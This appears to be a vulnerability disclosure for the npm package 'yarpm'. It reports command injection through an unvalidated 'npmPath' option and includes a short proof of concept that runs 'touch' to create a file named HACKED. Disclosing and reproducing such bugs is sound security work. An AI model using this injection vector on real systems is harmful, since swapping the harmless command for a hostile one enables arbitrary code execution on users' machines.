# :bug: Description

The `yarpm` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
const yarpm = require('yarpm');
yarpm(['HACKED'], {npmPath:'touch'});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i yarpm # Install affected module
node poc.js #  Run the PoC
```
14 Recheck the files: now `HACKED` has been created
